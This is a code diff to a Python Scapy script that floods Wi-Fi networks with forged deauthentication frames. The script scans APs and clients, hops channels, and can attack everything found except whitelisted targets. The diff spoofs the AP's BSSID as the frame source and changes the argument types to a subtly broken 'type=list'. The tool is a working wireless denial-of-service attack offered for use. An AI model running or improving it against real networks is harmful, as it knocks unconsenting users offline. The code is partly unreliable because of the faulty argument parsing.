@@ -26,15 +26,15 @@ logger.add(sys.stdout, format="{time} - {level} - {message}", level=log_level)
 
 # Initialize arguments
 parser = argparse.ArgumentParser(description="Deauth unwanted users from Wi-Fi network.")
-parser.add_argument("--deauth_reasons", nargs='+', type=int, default=[1, 2, 3, 4, 6, 7, 8, 10], help="List of deauth codes to be sent sequentially to the target. Default all.")
+parser.add_argument("--deauth_reasons", nargs='+', type=list, default=[1, 2, 3, 4, 6, 7, 8, 10], help="List of deauth codes to be sent sequentially to the target. Default all.")
 parser.add_argument("--deauth_seq", type=int, default=2, help="Number of packets for each reason to be sent at once.")
-parser.add_argument("--whitelist_ap", nargs='+', default=[], help="Ignore these ESSID or BSSID APs from attacking.")
-parser.add_argument("--whitelist_client", nargs='+', default=[], help="Ignore these clients from attacking.")
-parser.add_argument("--blacklist_ap", nargs='+', default=[], help="List of ESSID or BSSID AP targets.")
-parser.add_argument("--blacklist_client", nargs='+', default=[], help="List of client targets.")
+parser.add_argument("--whitelist_ap", nargs='+', default=[], help="Ignore these ESSID or BSSID APs from attacking. Should be passed in quotes.")
+parser.add_argument("--whitelist_client", nargs='+', default=[], help="Ignore these clients from attacking. Should be passed in quotes.")
+parser.add_argument("--blacklist_ap", nargs='+', default=[], help="List of ESSID or BSSID AP targets. Should be passed in quotes.")
+parser.add_argument("--blacklist_client", nargs='+', default=[], help="List of client targets. Should be passed in quotes.")
 parser.add_argument("--attack_all_ap", action='store_true', help="Allows to use empty blacklist lists and attacks all found AP, except for whitelist.")
 parser.add_argument("--attack_all_client", action='store_true', help="Allows to use empty blacklist lists and attacks all found Clients, except for whitelist.")
-parser.add_argument("--channel_list", nargs='+', type=int, default=list(range(1, 14)) + list(range(36, 165, 4)), help="Channels to hop. Default includes all 2.4GHz and 5GHz channels.")
+parser.add_argument("--channel_list", nargs='+', type=list, default=list(range(1, 14)) + list(range(36, 165, 4)), help="Channels to hop. Default includes all 2.4GHz and 5GHz channels.")
 parser.add_argument("--channel_wait", type=int, default=32, help="For how long to stay on a selected channel before hopping.")
 parser.add_argument("--scan_wait", type=int, default=10, help="For how long to scan")
 args = parser.parse_args()
@@ -100,18 +100,18 @@ def scan_networks(interface: str) -> Tuple[List[Tuple[str, str]], List[str]]:
     return ap_list, client_list
 
 
-def create_deauth_packet(src: str, dst: str, bssid: str, reason: int) -> RadioTap:
+def create_deauth_packet(target: str, bssid: str, reason: int) -> RadioTap:
     """
     Creates a deauthentication packet.
     
-    :param src: Source MAC address (client or AP sending the deauth).
-    :param dst: Destination MAC address (client or AP receiving the deauth).
-    :param bssid: BSSID of the AP.
+    :param target: target MAC address (client to deauth).
+    :param bssid: BSSID of the AP (used as source).
     :param reason: Reason code for the deauth.
     :return: The created deauthentication packet.
     """
-    dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
-    return RadioTap() / dot11 / Dot11Deauth(reason=reason)
+    dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) # Dot11(addr1=dst, addr2=src, addr3=bssid)
+    packet = [RadioTap() / dot11 / Dot11Deauth(reason=reason)]
+    return packet
 
 
 def send_deauth_packets(interface: str, target: str, bssid: str, reasons: List[int], seq: int) -> None:
@@ -126,7 +126,7 @@ def send_deauth_packets(interface: str, target: str, bssid: str, reasons: List[i
     """
     try:
         for reason in reasons:
-            packet = create_deauth_packet(src=target, dst=bssid, bssid=bssid, reason=reason)
+            packet = create_deauth_packet(target=target, bssid=bssid, reason=reason)
             sendp(packet, iface=interface, count=seq, inter=0.1, verbose=0)
             logger.debug(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
     except Exception as e:
